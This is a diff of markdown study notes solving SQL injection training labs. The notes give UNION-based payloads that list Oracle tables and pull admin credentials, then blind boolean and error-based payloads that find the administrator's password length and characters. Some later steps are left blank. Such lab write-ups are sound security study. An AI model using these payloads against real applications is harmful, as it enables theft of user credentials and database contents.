@@ -79,7 +79,7 @@ now we need to get all content of the database notice that we will use **informa
 
 ---
 
-## LAB 9 -- Lab: SQL injection attack, listing the database contents on Oracle
+## LAB 9 -- SQL injection attack, listing the database contents on Oracle
 
 **SOLUTION:**
 
@@ -88,3 +88,45 @@ now we need to get all content of the database notice that we will use **informa
 2. you need to get all the columns of the table with this payload:
    **'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users_abcdef'--**
 3. get the username and the pass of the admin with the following payload: **'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--**
+
+---
+
+## LAB 10 -- Exploiting blind SQL injection by triggering conditional responses:
+
+1. check if username administrator exist:
+   trackingID' and (select username from users where username = 'administrator') = 'administrator' --
+   "welcome back!" returned, username exist
+
+2. enumerate the length of the password:
+   send the request to the repeater and try:
+
+   - trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 1) = 'administrator'-- ===> welcome back returned so the length of the password is > 1 ofc
+   - trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 30) = 'administrator'-- ===> welcome back not returned so the length of the password is less then 30
+
+   after send the request to the intreducer and add the params start the and find the right length
+
+3. enumerate the password using cluster bomb attack:
+   after sending the request to the intruder and use brut forcer:
+   ' and (select substring(password,$1$,1) from users where username = 'administrator') = '$a$' --
+
+---
+
+## LAB 11 -- Blind SQL injection with conditional errors:
+
+1. first let's inject sql code that cause an error and see if the website is vulnerable using this code:
+   trackingID' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+   noticed that you will recieve internal error
+
+2. let's check if 'administrator' user is there:
+   '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+   if the user exist the condition will be executed otherwise it'll not
+
+3. password length enumuration:
+   '||(SELECT CASE WHEN LENGTH(password)=$1$ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+   when the right length found an error will accured
+
+4. password enumuration:
+
+---
+
+## LAB 12 --
